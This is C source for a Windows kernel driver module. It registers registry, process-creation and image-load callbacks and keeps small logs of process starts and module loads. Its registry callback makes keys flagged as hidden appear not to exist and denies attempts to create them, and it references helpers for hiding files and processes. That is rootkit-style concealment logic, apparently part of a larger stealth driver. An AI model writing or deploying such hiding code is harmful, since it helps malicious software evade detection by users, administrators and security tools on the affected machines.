#include "..\..\includes\shared.h"

extern BOOLEAN file_is_hidden(PCUNICODE_STRING path);

static LARGE_INTEGER g_reg_cookie = {0};
static volatile LONG g_reg_callback_active = 0;
static volatile LONG g_proc_notify_active = 0;
static volatile LONG g_image_notify_active = 0;

#define max_proc_log 64
#define max_image_log 64

static proc_log_entry g_proc_log[max_proc_log];
static volatile LONG g_proc_log_head = 0;
static KSPIN_LOCK g_proc_log_lock;

static image_log_entry g_image_log[max_image_log];
static volatile LONG g_image_log_head = 0;
static KSPIN_LOCK g_image_log_lock;

extern BOOLEAN process_is_hidden(ULONG pid);

static NTSTATUS reg_callback_routine(PVOID context, PVOID arg1, PVOID arg2)
{
    REG_NOTIFY_CLASS op;
    PREG_QUERY_KEY_INFORMATION qk;
    PREG_OPEN_KEY_INFORMATION ok;
    PREG_CREATE_KEY_INFORMATION ck;

    UNREFERENCED_PARAMETER(context);
    if (!InterlockedCompareExchange(&g_reg_callback_active, 1, 1)) return STATUS_SUCCESS;
    op = (REG_NOTIFY_CLASS)(ULONG_PTR)arg1;
    switch (op) {
    case RegNtPreOpenKeyEx:
    case RegNtPreOpenKey:
        ok = (PREG_OPEN_KEY_INFORMATION)arg2;
        if (ok && ok->CompleteName) {
            extern BOOLEAN reg_is_hidden(PCUNICODE_STRING path);
            if (reg_is_hidden(ok->CompleteName)) return STATUS_OBJECT_NAME_NOT_FOUND;
        }
        break;
    case RegNtPreCreateKeyEx:
    case RegNtPreCreateKey:
        ck = (PREG_CREATE_KEY_INFORMATION)arg2;
        if (ck && ck->CompleteName) {
            extern BOOLEAN reg_is_hidden(PCUNICODE_STRING path);
            if (reg_is_hidden(ck->CompleteName)) return STATUS_ACCESS_DENIED;
        }
        break;
    case RegNtPreQueryKey:
        qk = (PREG_QUERY_KEY_INFORMATION)arg2;
        UNREFERENCED_PARAMETER(qk);
        break;
    default:
        break;
    }
    return STATUS_SUCCESS;
}

static void proc_notify_routine(PEPROCESS process, HANDLE pid, PPS_CREATE_NOTIFY_INFO info)
{
    KIRQL irql;
    LONG idx;

    UNREFERENCED_PARAMETER(process);
    if (!InterlockedCompareExchange(&g_proc_notify_active, 1, 1)) return;
    KeAcquireSpinLock(&g_proc_log_lock, &irql);
    idx = g_proc_log_head % max_proc_log;
    g_proc_log[idx].pid = (ULONG)(ULONG_PTR)pid;
    if (info) {
        g_proc_log[idx].parent_pid = (ULONG)(ULONG_PTR)info->ParentProcessId;
        g_proc_log[idx].created = 1;
        if (info->ImageFileName && info->ImageFileName->Length > 0) {
            USHORT copy_len = info->ImageFileName->Length;
            if (copy_len > (max_name_len - 1) * sizeof(WCHAR))
                copy_len = (USHORT)((max_name_len - 1) * sizeof(WCHAR));
            RtlZeroMemory(g_proc_log[idx].name, sizeof(g_proc_log[idx].name));
            RtlCopyMemory(g_proc_log[idx].name, info->ImageFileName->Buffer, copy_len);
        } else {
            RtlZeroMemory(g_proc_log[idx].name, sizeof(g_proc_log[idx].name));
        }
    } else {
        g_proc_log[idx].parent_pid = 0;
        g_proc_log[idx].created = 0;
        RtlZeroMemory(g_proc_log[idx].name, sizeof(g_proc_log[idx].name));
    }
    g_proc_log_head++;
    KeReleaseSpinLock(&g_proc_log_lock, irql);
}

static void image_notify_routine(PUNICODE_STRING name, HANDLE pid, PIMAGE_INFO info)
{
    KIRQL irql;
    LONG idx;

    if (!InterlockedCompareExchange(&g_image_notify_active, 1, 1)) return;
    KeAcquireSpinLock(&g_image_log_lock, &irql);
    idx = g_image_log_head % max_image_log;
    g_image_log[idx].pid = (ULONG)(ULONG_PTR)pid;
    g_image_log[idx].system_wide = info->SystemModeImage ? 1 : 0;
    if (name && name->Length > 0) {
        USHORT copy_len = name->Length;
        if (copy_len > (max_path_len - 1) * sizeof(WCHAR))
            copy_len = (USHORT)((max_path_len - 1) * sizeof(WCHAR));
        RtlZeroMemory(g_image_log[idx].name, sizeof(g_image_log[idx].name));
        RtlCopyMemory(g_image_log[idx].name, name->Buffer, copy_len);
    } else {
        RtlZeroMemory(g_image_log[idx].name, sizeof(g_image_log[idx].name));
    }
    g_image_log_head++;
    KeReleaseSpinLock(&g_image_log_lock, irql);
}

void callback_init(void)
{
    KeInitializeSpinLock(&g_proc_log_lock);
    KeInitializeSpinLock(&g_image_log_lock);
    RtlZeroMemory(g_proc_log, sizeof(g_proc_log));
    RtlZeroMemory(g_image_log, sizeof(g_image_log));
}

void callback_cleanup(void)
{
    if (InterlockedCompareExchange(&g_reg_callback_active, 0, 1) == 1) {
        if (g_reg_cookie.QuadPart != 0) {
            CmUnRegisterCallback(g_reg_cookie);
            g_reg_cookie.QuadPart = 0;
        }
    }
    if (InterlockedCompareExchange(&g_proc_notify_active, 0, 1) == 1)
        PsSetCreateProcessNotifyRoutineEx(proc_notify_routine, TRUE);
    if (InterlockedCompareExchange(&g_image_notify_active, 0, 1) == 1)
        PsRemoveLoadImageNotifyRoutine(image_notify_routine);
}

NTSTATUS callback_enable_reg(PDRIVER_OBJECT driver)
{
    NTSTATUS status;
    UNICODE_STRING altitude;

    if (InterlockedCompareExchange(&g_reg_callback_active, 1, 0) == 1) return STATUS_ALREADY_REGISTERED;
    RtlInitUnicodeString(&altitude, L"320000");
    status = CmRegisterCallbackEx(reg_callback_routine, &altitude, driver, NULL, &g_reg_cookie, NULL);
    if (!NT_SUCCESS(status)) InterlockedExchange(&g_reg_callback_active, 0);
    return status;
}

NTSTATUS callback_disable_reg(void)
{
    if (InterlockedCompareExchange(&g_reg_callback_active, 0, 1) == 0) return STATUS_NOT_FOUND;
    if (g_reg_cookie.QuadPart != 0) {
        CmUnRegisterCallback(g_reg_cookie);
        g_reg_cookie.QuadPart = 0;
    }
    return STATUS_SUCCESS;
}

NTSTATUS callback_enable_proc(void)
{
    NTSTATUS status;
    if (InterlockedCompareExchange(&g_proc_notify_active, 1, 0) == 1) return STATUS_ALREADY_REGISTERED;
    status = PsSetCreateProcessNotifyRoutineEx(proc_notify_routine, FALSE);
    if (!NT_SUCCESS(status)) InterlockedExchange(&g_proc_notify_active, 0);
    return status;
}

NTSTATUS callback_disable_proc(void)
{
    if (InterlockedCompareExchange(&g_proc_notify_active, 0, 1) == 0) return STATUS_NOT_FOUND;
    PsSetCreateProcessNotifyRoutineEx(proc_notify_routine, TRUE);
    return STATUS_SUCCESS;
}

NTSTATUS callback_enable_image(void)
{
    NTSTATUS status;
    if (InterlockedCompareExchange(&g_image_notify_active, 1, 0) == 1) return STATUS_ALREADY_REGISTERED;
    status = PsSetLoadImageNotifyRoutine(image_notify_routine);
    if (!NT_SUCCESS(status)) InterlockedExchange(&g_image_notify_active, 0);
    return status;
}

NTSTATUS callback_disable_image(void)
{
    if (InterlockedCompareExchange(&g_image_notify_active, 0, 1) == 0) return STATUS_NOT_FOUND;
    PsRemoveLoadImageNotifyRoutine(image_notify_routine);
    return STATUS_SUCCESS;
}

ULONG callback_reg_active(void) { return (ULONG)InterlockedCompareExchange(&g_reg_callback_active, 0, 0); }
ULONG callback_proc_active(void) { return (ULONG)InterlockedCompareExchange(&g_proc_notify_active, 0, 0); }
ULONG callback_image_active(void) { return (ULONG)InterlockedCompareExchange(&g_image_notify_active, 0, 0); }

NTSTATUS callback_get_proc_log(PVOID buffer, ULONG size, PULONG copied)
{
    KIRQL irql;
    ULONG count, i, start;

    KeAcquireSpinLock(&g_proc_log_lock, &irql);
    count = (ULONG)g_proc_log_head;
    if (count > max_proc_log) count = max_proc_log;
    if (size < count * sizeof(proc_log_entry)) {
        KeReleaseSpinLock(&g_proc_log_lock, irql);
        *copied = count * sizeof(proc_log_entry);
        return STATUS_BUFFER_TOO_SMALL;
    }
    start = 0;
    if (g_proc_log_head > max_proc_log) start = g_proc_log_head % max_proc_log;
    for (i = 0; i < count; i++) {
        ULONG idx = (start + i) % max_proc_log;
        RtlCopyMemory((PUCHAR)buffer + i * sizeof(proc_log_entry), &g_proc_log[idx], sizeof(proc_log_entry));
    }
    KeReleaseSpinLock(&g_proc_log_lock, irql);
    *copied = count * sizeof(proc_log_entry);
    return STATUS_SUCCESS;
}

NTSTATUS callback_get_image_log(PVOID buffer, ULONG size, PULONG copied)
{
    KIRQL irql;
    ULONG count, i, start;

    KeAcquireSpinLock(&g_image_log_lock, &irql);
    count = (ULONG)g_image_log_head;
    if (count > max_image_log) count = max_image_log;
    if (size < count * sizeof(image_log_entry)) {
        KeReleaseSpinLock(&g_image_log_lock, irql);
        *copied = count * sizeof(image_log_entry);
        return STATUS_BUFFER_TOO_SMALL;
    }
    start = 0;
    if (g_image_log_head > max_image_log) start = g_image_log_head % max_image_log;
    for (i = 0; i < count; i++) {
        ULONG idx = (start + i) % max_image_log;
        RtlCopyMemory((PUCHAR)buffer + i * sizeof(image_log_entry), &g_image_log[idx], sizeof(image_log_entry));
    }
    KeReleaseSpinLock(&g_image_log_lock, irql);
    *copied = count * sizeof(image_log_entry);
    return STATUS_SUCCESS;
}

void callback_clear_proc_log(void)
{
    KIRQL irql;
    KeAcquireSpinLock(&g_proc_log_lock, &irql);
    RtlZeroMemory(g_proc_log, sizeof(g_proc_log));
    g_proc_log_head = 0;
    KeReleaseSpinLock(&g_proc_log_lock, irql);
}

void callback_clear_image_log(void)
{
    KIRQL irql;
    KeAcquireSpinLock(&g_image_log_lock, &irql);
    RtlZeroMemory(g_image_log, sizeof(g_image_log));
    g_image_log_head = 0;
    KeReleaseSpinLock(&g_image_log_lock, irql);
}

ULONG callback_proc_log_count(void) { return (ULONG)g_proc_log_head > max_proc_log ? max_proc_log : (ULONG)g_proc_log_head; }
ULONG callback_image_log_count(void) { return (ULONG)g_image_log_head > max_image_log ? max_image_log : (ULONG)g_image_log_head; }
